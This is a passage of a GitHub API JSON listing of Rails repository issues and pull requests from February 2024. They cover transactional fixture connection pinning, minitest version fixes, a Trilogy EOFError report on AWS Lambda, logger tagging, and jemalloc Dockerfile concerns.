            "diff_url": "https://github.com/rails/rails/pull/50999.diff",
            "patch_url": "https://github.com/rails/rails/pull/50999.patch",
            "merged_at": "2024-02-12T08:54:39Z"
        },
        "body": "Ref: https://github.com/rails/rails/pull/50793\r\n\r\nTransactional fixtures are currently tightly coupled with the pool active connection. It assumes calling `pool.connection` will memoize the checked out connection and leverage that to start a transaction on it and ensure all subsequent accesses will get the same connection.\r\n\r\nTo allow to remove checkout caching (or make it optional), we first must decouple transactional fixtures to not rely on it.\r\n\r\nThe idea is to behave similarly, but store the connection in the pool as a special \"pinned\" connection, and not as the regular active connection.\r\n\r\nThis allows to always return the same pinned connection, but without necessarily assigning it as the active connection.\r\n\r\nAdditionally, this pinning impact all threads and fibers, so that all threads have a consistent view of the database state.\r\n\r\nFYI @matthewd ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50999/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50999/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50998",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50998/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50998/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50998/events",
        "html_url": "https://github.com/rails/rails/pull/50998",
        "id": 2122855882,
        "node_id": "PR_kwDNIULOZkC-tQ",
        "number": 50998,
        "title": "[7-1-stable] Update minitest to include fix for test run filter",
        "user": {
            "login": "zzak",
            "id": 277819,
            "node_id": "MDQ6VXNlcjI3NzgxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/277819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zzak",
            "html_url": "https://github.com/zzak",
            "followers_url": "https://api.github.com/users/zzak/followers",
            "following_url": "https://api.github.com/users/zzak/following{/other_user}",
            "gists_url": "https://api.github.com/users/zzak/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zzak/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zzak/subscriptions",
            "organizations_url": "https://api.github.com/users/zzak/orgs",
            "repos_url": "https://api.github.com/users/zzak/repos",
            "events_url": "https://api.github.com/users/zzak/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zzak/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-07T11:50:29Z",
        "updated_at": "2024-02-08T01:25:51Z",
        "closed_at": "2024-02-08T01:25:44Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50998",
            "html_url": "https://github.com/rails/rails/pull/50998",
            "diff_url": "https://github.com/rails/rails/pull/50998.diff",
            "patch_url": "https://github.com/rails/rails/pull/50998.patch",
            "merged_at": null
        },
        "body": "Similar to #50997 for `7-1-stable` branch.\r\n\r\n( minitest/minitest@f92f48de00 )\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50998/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50998/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50997",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50997/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50997/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50997/events",
        "html_url": "https://github.com/rails/rails/pull/50997",
        "id": 2122853615,
        "node_id": "PR_kwDNIULOZkC21g",
        "number": 50997,
        "title": "Update minitest to include fix for test run filter",
        "user": {
            "login": "zzak",
            "id": 277819,
            "node_id": "MDQ6VXNlcjI3NzgxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/277819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zzak",
            "html_url": "https://github.com/zzak",
            "followers_url": "https://api.github.com/users/zzak/followers",
            "following_url": "https://api.github.com/users/zzak/following{/other_user}",
            "gists_url": "https://api.github.com/users/zzak/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zzak/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zzak/subscriptions",
            "organizations_url": "https://api.github.com/users/zzak/orgs",
            "repos_url": "https://api.github.com/users/zzak/repos",
            "events_url": "https://api.github.com/users/zzak/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zzak/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-07T11:49:08Z",
        "updated_at": "2024-02-08T01:25:55Z",
        "closed_at": "2024-02-08T01:25:49Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50997",
            "html_url": "https://github.com/rails/rails/pull/50997",
            "diff_url": "https://github.com/rails/rails/pull/50997.diff",
            "patch_url": "https://github.com/rails/rails/pull/50997.patch",
            "merged_at": null
        },
        "body": "This PR reverts #50978 and bumps the version of minitest in our Gemfile.lock",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50997/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50997/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50996",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50996/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50996/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50996/events",
        "html_url": "https://github.com/rails/rails/pull/50996",
        "id": 2122822703,
        "node_id": "PR_kwDNIULOZkBICw",
        "number": 50996,
        "title": "[7-1-stable] Pin minitest version to 5.21",
        "user": {
            "login": "zzak",
            "id": 277819,
            "node_id": "MDQ6VXNlcjI3NzgxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/277819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zzak",
            "html_url": "https://github.com/zzak",
            "followers_url": "https://api.github.com/users/zzak/followers",
            "following_url": "https://api.github.com/users/zzak/following{/other_user}",
            "gists_url": "https://api.github.com/users/zzak/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zzak/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zzak/subscriptions",
            "organizations_url": "https://api.github.com/users/zzak/orgs",
            "repos_url": "https://api.github.com/users/zzak/repos",
            "events_url": "https://api.github.com/users/zzak/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zzak/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-07T11:35:37Z",
        "updated_at": "2024-02-08T11:42:05Z",
        "closed_at": "2024-02-08T11:41:47Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50996",
            "html_url": "https://github.com/rails/rails/pull/50996",
            "diff_url": "https://github.com/rails/rails/pull/50996.diff",
            "patch_url": "https://github.com/rails/rails/pull/50996.patch",
            "merged_at": null
        },
        "body": "Backport #50978 to `7-1-stable`, while I'm not so sure this qualifies as backport material it is a major problem that none of the tests are running.\r\n\r\nOriginal description:\r\n\r\n---\r\n\r\nManaged to reproduce CI failure at https://buildkite.com/rails/rails-nightly/builds/133#018d7bb8-8a32-4978-8e36-d7cb9b067813/1196-1204 . It would also reproduce against the released versions of Ruby because this is triggered by minitest v5.22.0 change. https://github.com/minitest/minitest/commit/ebb468c81c0eea069234127bd6a101c84e955872\r\n\r\nTo avoid all of railties CI failures, pin minitest version to 5.21 tentatively.\r\n\r\n* Steps to reproduce\r\n```ruby\r\ngit clone https://github.com/rails/rails\r\ncd rails\r\nrm Gemfile.lock\r\nbundle install\r\ncd railties\r\nbin/test test/application/test_runner_test.rb -n test_system_tests_are_not_run_with_the_default_test_command\r\n```\r\n\r\n* Expected behavior It should pass.\r\n\r\n* Actual behavior\r\n```ruby\r\n$ bin/test test/application/test_runner_test.rb -n test_system_tests_are_not_run_with_the_default_test_command\r\nRun options: -n test_system_tests_are_not_run_with_the_default_test_command --seed 14574\r\n\r\nF\r\n\r\nFailure:\r\nApplicationTests::TestRunnerTest#test_system_tests_are_not_run_with_the_default_test_command [test/application/test_runner_test.rb:1191]:\r\nExpected /0\\ runs,\\ 0\\ assertions,\\ 0\\ failures,\\ 0\\ errors,\\ 0\\ skips/ to match \"Nothing ran for filter: \\nRunning 0 tests in a single process (parallelization threshold is 50)\\nRun options: --seed 45713\\n\\n# Running:\\n\\n\".\r\n\r\nbin/test test/application/test_runner_test.rb:1179\r\n\r\nFinished in 9.982314s, 0.1002 runs/s, 0.2004 assertions/s.\r\n1 runs, 2 assertions, 1 failures, 0 errors, 0 skips\r\n$\r\n```",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50996/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50996/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50995",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50995/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50995/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50995/events",
        "html_url": "https://github.com/rails/rails/pull/50995",
        "id": 2122792791,
        "node_id": "PR_kwDNIULOZj_feQ",
        "number": 50995,
        "title": "[7-1-stable] Fix Active Storage test configurations for CI",
        "user": {
            "login": "zzak",
            "id": 277819,
            "node_id": "MDQ6VXNlcjI3NzgxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/277819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zzak",
            "html_url": "https://github.com/zzak",
            "followers_url": "https://api.github.com/users/zzak/followers",
            "following_url": "https://api.github.com/users/zzak/following{/other_user}",
            "gists_url": "https://api.github.com/users/zzak/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zzak/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zzak/subscriptions",
            "organizations_url": "https://api.github.com/users/zzak/orgs",
            "repos_url": "https://api.github.com/users/zzak/repos",
            "events_url": "https://api.github.com/users/zzak/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zzak/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-07T11:18:40Z",
        "updated_at": "2024-02-09T23:32:57Z",
        "closed_at": "2024-02-09T23:32:57Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50995",
            "html_url": "https://github.com/rails/rails/pull/50995",
            "diff_url": "https://github.com/rails/rails/pull/50995.diff",
            "patch_url": "https://github.com/rails/rails/pull/50995.patch",
            "merged_at": "2024-02-09T23:32:57Z"
        },
        "body": "Apply #50967 to 7-1-stable, to simplify the tests for metadata and corrects the test configuration path with improvements to the readability.\r\n\r\nThis change improves upon #50787 in that it removes the need to stringify or symbolize any keys, since we are comparing the metadata with string keys. This is a follow up to #43705.\r\n\r\nSorry this took me 2 PRs! :bow:",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50995/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50995/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50994",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50994/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50994/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50994/events",
        "html_url": "https://github.com/rails/rails/pull/50994",
        "id": 2122617879,
        "node_id": "PR_kwDNIULOZj16_A",
        "number": 50994,
        "title": "Document ActiveRecord `alias_attribute` [ci-skip]",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-07T09:50:06Z",
        "updated_at": "2024-02-07T13:50:25Z",
        "closed_at": "2024-02-07T13:50:12Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50994",
            "html_url": "https://github.com/rails/rails/pull/50994",
            "diff_url": "https://github.com/rails/rails/pull/50994.diff",
            "patch_url": "https://github.com/rails/rails/pull/50994.patch",
            "merged_at": "2024-02-07T13:50:12Z"
        },
        "body": "This documents how `alias_attribute` works, including for queries.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50994/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50994/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50993",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50993/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50993/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50993/events",
        "html_url": "https://github.com/rails/rails/issues/50993",
        "id": 2122318573,
        "node_id": "I_kwDNIULOfoAC7Q",
        "number": 50993,
        "title": "Trilogy:EOFError cannot be recovered on ActiveRecord 7.1",
        "user": {
            "login": "zhangyangyu",
            "id": 3690895,
            "node_id": "MDQ6VXNlcjM2OTA4OTU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3690895?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zhangyangyu",
            "html_url": "https://github.com/zhangyangyu",
            "followers_url": "https://api.github.com/users/zhangyangyu/followers",
            "following_url": "https://api.github.com/users/zhangyangyu/following{/other_user}",
            "gists_url": "https://api.github.com/users/zhangyangyu/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zhangyangyu/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zhangyangyu/subscriptions",
            "organizations_url": "https://api.github.com/users/zhangyangyu/orgs",
            "repos_url": "https://api.github.com/users/zhangyangyu/repos",
            "events_url": "https://api.github.com/users/zhangyangyu/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zhangyangyu/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-07T06:58:16Z",
        "updated_at": "2024-02-09T18:01:34Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\n```ruby\r\nrequire 'json'\r\nrequire 'rack'\r\nrequire 'base64'\r\nrequire \"bundler\"\r\n\r\nBundler.require(:default)\r\n\r\n#$app ||= Rack::Builder.parse_file(\"#{__dir__}/config.ru\").first\r\n#RELATIVE_URL_ROOT = ENV['RAILS_RELATIVE_URL_ROOT']\r\n\r\nActiveRecord::Base.establish_connection(\r\n  adapter:            'trilogy',\r\n  database:           'test',\r\n  host:               'xxxx',\r\n  username:           'xxxxx',\r\n  password:           'xxxxx',\r\n  port:               4000,\r\n  ssl_mode:           'VERIFY_IDENTITY',\r\n  encoding:           'utf8mb4',\r\n  collation:          'utf8mb4_general_ci',\r\n  pool:               2500,\r\n  checkout_timeout:   5,\r\n  connect_timeout:    5,\r\n  read_timeout:       5,\r\n  idle_timeout:       0,\r\n  reaping_frequency:  0,\r\n)\r\n\r\nDir[\"./app/models/*.rb\"].each do |file|\r\n  require file\r\nend\r\n\r\ndef handler(event:, context:)\r\n  httpMethod = event.fetch('httpMethod')\r\n  STDOUT.write Process.pid\r\n  STDOUT.write \"\\n\"\r\n  STDOUT.write httpMethod\r\n  STDOUT.write \"\\n\"\r\n\r\n  if httpMethod == \"POST\"\r\n    discard = Message.take().as_json()\r\n    STDOUT.write discard\r\n    STDOUT.write \"\\n\"\r\n    discard = 'returned'\r\n    return {\r\n      'statusCode' => 200,\r\n      'body' => discard,\r\n    }\r\n  else\r\n    return {\r\n      'statusCode' => 200,\r\n      'body' => \"pong\"\r\n    }\r\n  end\r\nend\r\n```\r\n\r\nWe are using ActiveRecord 7.1.3 on AWS Lambda Function to connect to database using Trilogy driver(2.7). We found occasionally there are `EOFError`. We tried to reproduce it and find when a connection is checked out from the pool, [after some time](https://docs.aws.amazon.com/vpc/latest/userguide/nat-gateway-troubleshooting.html#nat-gateway-troubleshooting-timeout) when the underlying TCP connection is broken, following query on the connection could trigger the error. On AWS Lambda Function we could steadily reproduce it with all 7.1.x versions. 7.0.8 works well. Can't reproduce it locally. And pool configuration like `idle_timeout`/`reaping_frequency` doesn't change anything.\r\n![img_v3_027q_971706a5-dfe9-4e5b-ac37-114d993fc1dg](https://github.com/rails/rails/assets/3690895/90e09bbf-828b-449d-8e10-8c6c3fcf496b)\r\n\r\n### Expected behavior\r\nThe broken connection could be recovered and doesn't affect application.\r\n\r\n### Actual behavior\r\nError is raised.\r\n### System configuration\r\n**Rails version**:\r\n7.1\r\n**Ruby version**:\r\n3.2.2",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50993/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50993/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50992",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50992/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50992/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50992/events",
        "html_url": "https://github.com/rails/rails/pull/50992",
        "id": 2122097495,
        "node_id": "PR_kwDNIULOZjaDRA",
        "number": 50992,
        "title": "Don't pop logger tags in Rails::Rack::Logger until request is finished",
        "user": {
            "login": "KJTsanaktsidis",
            "id": 1418177,
            "node_id": "MDQ6VXNlcjE0MTgxNzc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1418177?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/KJTsanaktsidis",
            "html_url": "https://github.com/KJTsanaktsidis",
            "followers_url": "https://api.github.com/users/KJTsanaktsidis/followers",
            "following_url": "https://api.github.com/users/KJTsanaktsidis/following{/other_user}",
            "gists_url": "https://api.github.com/users/KJTsanaktsidis/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/KJTsanaktsidis/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/KJTsanaktsidis/subscriptions",
            "organizations_url": "https://api.github.com/users/KJTsanaktsidis/orgs",
            "repos_url": "https://api.github.com/users/KJTsanaktsidis/repos",
            "events_url": "https://api.github.com/users/KJTsanaktsidis/events{/privacy}",
            "received_events_url": "https://api.github.com/users/KJTsanaktsidis/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-07T03:12:30Z",
        "updated_at": "2024-02-13T00:31:09Z",
        "closed_at": "2024-02-09T23:38:55Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50992",
            "html_url": "https://github.com/rails/rails/pull/50992",
            "diff_url": "https://github.com/rails/rails/pull/50992.diff",
            "patch_url": "https://github.com/rails/rails/pull/50992.patch",
            "merged_at": "2024-02-09T23:38:55Z"
        },
        "body": "\r\n\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\nAt the moment, Rails::Rack::Logger tags the logger (if it's `ActiveSupport::TaggedLogging`) for the duration of the `@app.call`, but only fires the request.action_dispatch event later, on body close. That means anything logged in `request.action_dispatch` handlers won't have the same tags as the rest of the request.\r\n\r\n### Detail\r\n\r\nFix this by deferring the popping of tags into `finish_request_instrumentation`, in the same way that finishing the instrumentation handle is deferred.\r\n\r\n\r\n### Additional information\r\n\r\nThere didn't seem to be any test case related to request log taggers, so I added one. Also, I don't know if this is important enough for a changelog entry, but it seemed harmless enough to add a one-liner in there.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50992/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50992/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50991",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50991/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50991/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50991/events",
        "html_url": "https://github.com/rails/rails/issues/50991",
        "id": 2121919680,
        "node_id": "I_kwDNIULOfnnswA",
        "number": 50991,
        "title": "jemalloc Dockerfile configuration may be problematic across architectures",
        "user": {
            "login": "modosc",
            "id": 2231664,
            "node_id": "MDQ6VXNlcjIyMzE2NjQ=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2231664?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/modosc",
            "html_url": "https://github.com/modosc",
            "followers_url": "https://api.github.com/users/modosc/followers",
            "following_url": "https://api.github.com/users/modosc/following{/other_user}",
            "gists_url": "https://api.github.com/users/modosc/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/modosc/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/modosc/subscriptions",
            "organizations_url": "https://api.github.com/users/modosc/orgs",
            "repos_url": "https://api.github.com/users/modosc/repos",
            "events_url": "https://api.github.com/users/modosc/events{/privacy}",
            "received_events_url": "https://api.github.com/users/modosc/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-07T00:21:28Z",
        "updated_at": "2024-02-09T15:18:13Z",
        "closed_at": "2024-02-09T15:18:13Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "i just noted https://github.com/rails/rails/pull/50943 merged (which is awesome!). however, i think there may be some issues when running on different architectures. \r\n\r\nsee [this comment](https://github.com/docker-library/ruby/issues/182) for a solution. i'm not 100% sure how to apply this to the `Dockerfile` generation in rails (otherwise i'd create a pr) but i know locally we had to do this to ensure our `Dockerfile` ran our rails app + `jemalloc` across the following architectures:\r\n * aarch64-linux\r\n * arm64-darwin-*\r\n * x86_64-darwin-*\r\n * x86_64-linux\r\n\r\nalso i haven't tested the [other simpler solution](https://github.com/docker-library/ruby/issues/182#issuecomment-1570307359) proposed in this issue either but maybe it's the way to go?",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50991/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50991/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50990",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50990/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50990/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50990/events",
        "html_url": "https://github.com/rails/rails/pull/50990",
        "id": 2121743445,
        "node_id": "PR_kwDNIULOZjHtKg",
        "number": 50990,
        "title": "Add minimum size to connection pool",
        "user": {
            "login": "catlee",
            "id": 54458,
            "node_id": "MDQ6VXNlcjU0NDU4",
            "avatar_url": "https://avatars.githubusercontent.com/u/54458?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/catlee",
            "html_url": "https://github.com/catlee",
            "followers_url": "https://api.github.com/users/catlee/followers",
            "following_url": "https://api.github.com/users/catlee/following{/other_user}",
            "gists_url": "https://api.github.com/users/catlee/gists{/gist_id}",
